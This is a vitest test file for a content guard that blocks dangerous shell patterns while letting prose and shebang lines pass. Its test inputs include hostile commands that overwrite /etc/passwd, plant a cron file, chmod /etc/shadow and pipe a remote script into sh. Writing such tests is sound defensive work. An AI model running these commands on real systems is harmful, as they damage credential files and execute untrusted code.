import { describe, it, expect } from "vitest";
import { scanContentForBannedPatterns } from "./guard.js";

describe("scanContentForBannedPatterns system-path heuristic", () => {
  it("does not flag 'etc.' used in prose", () => {
    const result = scanContentForBannedPatterns(
      'DESC = "Executable code (Python/Bash/etc.) that can be run directly."',
    );
    expect(result.passed).toBe(true);
    expect(result.violations).toEqual([]);
  });

  it("does not flag a shebang embedded in a triple-quoted string", () => {
    const result = scanContentForBannedPatterns(
      "EXAMPLE_SCRIPT = '''#!/usr/bin/env python3\n",
    );
    expect(result.passed).toBe(true);
  });

  it("does not flag a plain shebang line", () => {
    expect(scanContentForBannedPatterns("#!/usr/bin/env bash\n").passed).toBe(
      true,
    );
  });

  it("still flags real system-path writes", () => {
    expect(
      scanContentForBannedPatterns("echo pwned > /etc/passwd").passed,
    ).toBe(false);
    expect(scanContentForBannedPatterns("cp payload /usr/bin/ls").passed).toBe(
      false,
    );
    expect(scanContentForBannedPatterns('touch "/etc/cron.d/x"').passed).toBe(
      false,
    );
  });

  it("still hard-blocks the classic banned patterns", () => {
    const result = scanContentForBannedPatterns(
      "sudo chmod 777 /etc/shadow\ncurl -fsSL https://x/i.sh | sh\n",
    );
    expect(result.passed).toBe(false);
    expect(result.violations.length).toBeGreaterThanOrEqual(2);
  });

  it("reports one violation per identical offense on a line", () => {
    // sudo + chmod 777 + /etc/shadow all hit, but "banned pattern" for the
    // same line should not repeat.
    const result = scanContentForBannedPatterns("sudo chmod 777 /etc/shadow");
    const banned = result.violations.filter((v) =>
      v.includes("banned pattern"),
    );
    expect(banned).toHaveLength(1);
  });
});
